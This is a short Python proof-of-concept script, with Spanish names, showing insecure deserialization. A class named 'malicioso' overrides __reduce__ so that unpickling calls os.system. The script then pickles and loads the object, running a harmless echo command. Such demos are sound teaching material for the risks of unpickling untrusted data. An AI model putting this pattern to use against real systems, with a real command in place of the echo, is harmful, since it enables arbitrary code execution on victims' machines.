import os
import pickle

class malicioso:
    def  __reduce__(self):
        return (os.system,("echo TEXTO QUE SE EJECUTA EN EL SISTEMA" ,))

carga = pickle.dumps(malicioso())
# print(carga)

pickle.loads(carga)